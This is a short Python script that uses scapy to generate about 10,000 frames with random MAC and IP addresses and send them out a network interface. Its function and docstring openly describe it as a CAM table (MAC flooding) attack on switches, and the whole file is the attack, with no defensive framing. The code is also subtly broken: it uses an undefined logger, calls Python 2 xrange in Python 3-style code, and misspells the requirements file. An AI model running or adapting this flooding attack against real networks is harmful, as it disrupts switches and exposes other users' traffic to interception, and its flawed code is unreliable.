# coding: utf8
# vi: ft=python expandtab ts=4 sts=4 sw=4

import logging

try:
    from scapy.all import Ether, IP, TCP, RandIP, RandMAC, sendp
except ImportError as exc:
    _log.fatal(
        "You need scapy to run this program "
        "run this command: sudo python3 -m pip install -r requitements.txt"
    )

def generate_packets() -> list:
    """Simple packet_list to hold all packets

    Args:
        None
    Return:
        list: packet list.
    """

    packet_list = []
    for i in xrange(1,10000):
        packet  = Ether(src = RandMAC(),dst= RandMAC())/IP(src=RandIP(),dst=RandIP())
        packet_list.append(packet)
    return packet_list

def cam_overflow(packet_list: list):
    """Try cam flooding

    Args:
        packet_list (list): the packet list generated to flood
    """
    sendp(packet_list, iface='e0')

if __name__ == '__main__':
    packet_list = generate_packets()
    cam_overflow(packet_list)
